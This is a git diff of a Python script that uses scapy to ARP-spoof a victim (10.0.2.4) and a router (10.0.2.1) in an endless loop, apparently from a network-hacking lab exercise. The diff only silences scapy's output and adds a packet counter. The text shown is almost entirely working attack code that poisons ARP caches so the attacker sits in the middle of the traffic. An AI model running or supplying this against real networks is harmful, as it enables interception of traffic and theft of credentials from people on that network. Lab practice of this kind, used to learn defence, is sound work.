@@ -23,13 +23,16 @@ def arp_spoof(target_ip, spoof_ip):
     target_mac = get_mac(target_ip)
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # 'op=1' is a request, 'op=2' is a response
     # scapy.ls(packet) # list out the field available for scapy.ARP
-    scapy.send(packet)
+    scapy.send(packet, verbose=False)
 
 
 # To allow the program to keep spoofing the victim and the router
+counter = 0
 while True:
     arp_spoof('10.0.2.4', '10.0.2.1') # Tell the victim that I am the router
     arp_spoof('10.0.2.1', '10.0.2.4') # Tell the router that I am the victim
+    counter += 2
+    print(f'\r[+] Packets sent: {counter}', end='')
     time.sleep(2)
 
 
